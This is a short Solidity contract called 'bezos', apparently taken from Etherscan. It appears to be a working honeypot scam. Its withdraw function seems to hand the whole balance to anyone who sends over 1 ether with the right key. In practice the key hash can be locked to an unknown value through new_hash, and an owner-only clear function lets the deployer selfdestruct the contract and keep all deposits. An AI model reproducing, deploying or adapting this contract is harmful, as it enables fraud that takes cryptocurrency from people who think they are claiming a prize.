/**
 * Source Code first verified at https://etherscan.io on Monday, April 1, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract bezos
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x8fa9d37213d6b5331ad735c2c2330f919d0d4a02b218bf4bd515a4f1f8a05dfd;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 1 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function new_hash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}